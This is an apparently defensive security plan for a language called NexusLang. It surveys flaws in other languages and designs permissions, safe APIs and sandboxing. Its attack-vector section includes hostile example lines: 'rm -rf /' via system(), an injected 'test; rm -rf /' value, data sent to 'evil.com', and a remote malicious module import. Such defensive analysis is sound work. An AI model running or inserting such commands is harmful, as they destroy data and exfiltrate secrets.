# NexusLang Security Analysis & Enhancement Plan
## Date: February 1, 2026

## 1. Security Issues in Modern Languages (Research)

### Rust
**Issues:**
- Unsafe blocks bypass borrow checker (memory safety escapes)
- FFI boundaries are inherently unsafe
- Proc macros can execute arbitrary code at compile time
- No runtime bounds checking in release mode by default
- Dependency supply chain attacks (crates.io)

**Lessons for NexusLang:**
- Clearly mark unsafe operations
- Provide safe wrappers for common FFI patterns
- Enable bounds checking by default

### Python
**Issues:**
- `eval()` and `exec()` execute arbitrary code
- Pickle deserialization can execute code
- No memory safety (C extensions can corrupt memory)
- `__import__` allows dynamic imports
- SQL injection via string concatenation
- Command injection via `os.system()`, `subprocess.shell=True`
- Path traversal vulnerabilities
- No built-in permission system

**Lessons for NexusLang:**
- Ban or restrict eval-like features
- Provide safe serialization alternatives
- Require explicit opt-in for dangerous operations
- Add permission system

### JavaScript/Node.js
**Issues:**
- `eval()` and `Function()` execute arbitrary code
- Prototype pollution attacks
- ReDoS (Regular Expression Denial of Service)
- `child_process.exec()` command injection
- XSS vulnerabilities in web contexts
- Dependency confusion attacks (npm)
- No filesystem/network permissions

**Lessons for NexusLang:**
- Deno's permission model is excellent (adopt similar)
- Validate and sanitize all external input
- Provide XSS-safe output functions

### Go
**Issues:**
- No bounds checking by default in some operations
- Race conditions in concurrent code
- Path traversal in file operations
- Command injection via `exec.Command` with shell
- No memory safety for unsafe package
- TOCTOU (Time-of-check to time-of-use) bugs

**Lessons for NexusLang:**
- Add race detection tools
- Validate file paths
- Never use shell expansion by default

### Zig
**Issues:**
- Manual memory management (use-after-free possible)
- No runtime bounds checking by default
- Undefined behavior in release mode
- FFI is completely unsafe

**Lessons for NexusLang:**
- Keep runtime checks even in optimized builds
- Provide memory safety by default

### Swift
**Issues:**
- Force unwrapping optionals causes crashes
- Unsafe pointer operations
- Objective-C interop bypasses safety
- Reference cycles cause memory leaks

**Lessons for NexusLang:**
- Encourage safe handling of nullable values
- Make memory leaks detectable

### Carbon (Google's experimental C++ successor)
**Issues (from proposals):**
- C++ interop inherits all C++ unsafety
- Still allows manual memory management
- Complex ownership model may be error-prone

**Lessons for NexusLang:**
- C interop should be explicitly unsafe
- Provide high-level safe abstractions

## 2. NexusLang Attack Vectors (Current State)

### 2.1 Foreign Function Interface (FFI)
**Vulnerability:** Direct C function calls can corrupt memory
```nlpl
# Current NexusLang allows unrestricted FFI
import foreign function "system" from "libc.so.6" as system
call system with "/bin/sh -c 'rm -rf /'"  # DANGEROUS!
```

**Risk Level:** CRITICAL
**Mitigation Needed:** 
- Require --allow-ffi permission
- Warn about unsafe FFI calls
- Provide safe wrappers

### 2.2 Inline Assembly
**Vulnerability:** Direct hardware access, can bypass all protections
```nlpl
asm
    code "mov rax, 0x12345678; jmp rax"  # Jump to arbitrary address
end
```

**Risk Level:** CRITICAL
**Mitigation Needed:**
- Require --allow-asm permission
- Only allow in trusted contexts
- Validate assembly instructions in safe mode

### 2.3 File I/O Operations
**Vulnerability:** Path traversal, unauthorized reads/writes
```nlpl
# User input not validated
set filename to read_user_input
write_file to filename with "data"  # Could write to /etc/passwd
```

**Risk Level:** HIGH
**Mitigation Needed:**
- Require --allow-read and --allow-write permissions
- Validate paths (no ../, no absolute paths by default)
- Whitelist allowed directories

### 2.4 Network Operations
**Vulnerability:** Unauthorized network access, data exfiltration
```nlpl
# No restrictions
create_socket to "evil.com" on port 80
send_data to socket with sensitive_data
```

**Risk Level:** HIGH
**Mitigation Needed:**
- Require --allow-net permission
- Optional: whitelist allowed domains/IPs

### 2.5 Subprocess Execution
**Vulnerability:** Command injection, shell expansion
```nlpl
# If system() function exists
set user_input to "test; rm -rf /"
execute_command "ls " concatenate user_input  # DANGEROUS!
```

**Risk Level:** CRITICAL
**Mitigation Needed:**
- Require --allow-run permission
- Never use shell expansion by default
- Provide safe subprocess APIs

### 2.6 Memory Operations
**Vulnerability:** Buffer overflows, use-after-free
```nlpl
# Direct memory manipulation
set ptr to allocate 10 bytes
free ptr
set value to dereference ptr  # Use after free!
```

**Risk Level:** HIGH
**Mitigation Needed:**
- Runtime bounds checking
- Track allocation/deallocation
- Detect use-after-free

### 2.7 Module System
**Vulnerability:** Import arbitrary code, dependency attacks
```nlpl
# No verification
import "http://evil.com/malicious_module"
```

**Risk Level:** MEDIUM
**Mitigation Needed:**
- Require --allow-import for remote imports
- Verify checksums/signatures
- Sandbox imported code

### 2.8 Environment Variables
**Vulnerability:** Information disclosure, privilege escalation
```nlpl
# Access sensitive env vars
set api_key to get_env "SECRET_API_KEY"
```

**Risk Level:** MEDIUM
**Mitigation Needed:**
- Require --allow-env permission
- Restrict access to sensitive variables

## 3. Permission System Design (Deno-inspired)

### 3.1 Permission Flags

**Filesystem:**
- `--allow-read[=<paths>]` - Allow reading files
- `--allow-write[=<paths>]` - Allow writing files

**Network:**
- `--allow-net[=<hosts>]` - Allow network access

**Subprocess:**
- `--allow-run[=<programs>]` - Allow running subprocesses

**Foreign Code:**
- `--allow-ffi[=<libraries>]` - Allow FFI/C interop
- `--allow-asm` - Allow inline assembly

**System:**
- `--allow-env[=<vars>]` - Allow environment variable access
- `--allow-all` - Allow everything (development only)

**Import:**
- `--allow-import[=<urls>]` - Allow remote imports

### 3.2 Prompt Mode
Interactive prompts when permission needed:
```
⚠️  NexusLang requests file write access
   Path: /home/user/data.txt
   Allow? [y/N/A(always)]
```

### 3.3 Runtime API
```nlpl
# Query permissions at runtime
set has_net to check_permission "net"
if has_net is false
    print text "Network access denied"
    exit with 1
```

## 4. Safe-by-Default APIs

### 4.1 Path Validation
```nlpl
# Built-in safe path handling
function safe_path with user_path returns String
    # Remove ../ traversal
    # Block absolute paths outside allowed dirs
    # Normalize path separators
    return validated_path
```

### 4.2 Command Execution (Safe)
```nlpl
# No shell expansion by default
function safe_execute with program as String and args as List returns Integer
    # Execute directly without shell
    # No glob expansion, no variable substitution
    return exit_code
```

### 4.3 SQL Query Builder (Parameterized)
```nlpl
# Built-in SQL injection protection
set query to create_sql_query
add_select to query with "users"
add_where to query with "id" equals parameter 1
set result to execute_query with query and [user_id]
```

### 4.4 XSS Protection
```nlpl
# Auto-escape HTML by default
function render_html with template as String and data as Dict returns String
    # Escape all variables by default
    # Require explicit |raw filter for unescaped
    return safe_html
```

### 4.5 Input Validation
```nlpl
# Built-in validators
set is_valid to validate_email with user_email
set is_safe_path to validate_path with user_path
set is_safe_url to validate_url with user_url
```

## 5. Memory Safety Enhancements

### 5.1 Bounds Checking
```nlpl
# Runtime bounds checking (always enabled)
set arr to [1, 2, 3]
set val to arr[10]  # ERROR: Index out of bounds
```

### 5.2 Use-After-Free Detection
```nlpl
# Track allocations
set ptr to allocate 100 bytes
free ptr
set val to dereference ptr  # ERROR: Use after free detected
```

### 5.3 Buffer Overflow Protection
```nlpl
# Check buffer sizes
set buf to allocate 10 bytes
write_to_buffer buf at offset 15 with data  # ERROR: Buffer overflow
```

### 5.4 Null Pointer Guards
```nlpl
# Explicit null checking
set ptr to null
if ptr is not null
    set val to dereference ptr  # Safe
# dereference ptr  # ERROR: Null pointer dereference
```

## 6. Sandboxing Options

### 6.1 Restricted Mode
```bash
nlpl --sandbox script.nlpl
# Disables: FFI, inline asm, subprocess, network
# Enables: Only local file read (no write)
```

### 6.2 Web Assembly Target
```bash
nlplc --target wasm script.nlpl
# Compiled WASM runs in browser sandbox
# No filesystem, limited capabilities
```

## 7. Security Best Practices Documentation

### 7.1 Secure Coding Guide
- Never trust user input
- Always validate and sanitize
- Use parameterized queries
- Escape output in web contexts
- Principle of least privilege
- Defense in depth

### 7.2 Common Pitfalls
- String concatenation in SQL
- Shell expansion in commands
- Path traversal in file ops
- Integer overflow in arithmetic
- Race conditions in concurrent code

### 7.3 Security Checklist
- [ ] All file paths validated
- [ ] All commands use safe execution
- [ ] All database queries parameterized
- [ ] All web output escaped
- [ ] All FFI calls reviewed
- [ ] Minimal permissions granted

## 8. Implementation Priority

**Phase 1 (Immediate - This Session):**
1. ✅ Permission system foundation
2. ✅ Basic path validation
3. ✅ Command injection prevention
4. ✅ Security documentation

**Phase 2 (Next Session):**
5. Enhanced memory safety checks
6. Sandboxing mode
7. Input validation library
8. Security test suite

**Phase 3 (Future):**
9. Code signing for imports
10. Security audit logging
11. Fuzzing infrastructure
12. Security advisories system

## 9. Comparison with Other Languages

| Feature | Rust | Python | Node.js | Deno | NexusLang (Goal) |
|---------|------|--------|---------|------|-------------|
| Memory Safety | ✅ | ❌ | ❌ | ✅ | ✅ |
| Permission System | ❌ | ❌ | ❌ | ✅ | ✅ |
| Safe FFI | Partial | ❌ | ❌ | ✅ | ✅ |
| Bounds Checking | Release:❌ | ✅ | ✅ | ✅ | ✅ |
| Path Validation | ❌ | ❌ | ❌ | ✅ | ✅ |
| Safe Subprocess | ❌ | Partial | ❌ | ✅ | ✅ |
| Input Validators | ❌ | ❌ | ❌ | ❌ | ✅ |

**NLPL Goal:** Be more secure than Rust (safer defaults) and Python (permission system) combined.

## Next Steps

Starting implementation of:
1. Permission system in runtime
2. Path validation utilities
3. Safe subprocess execution
4. Security configuration
5. Documentation
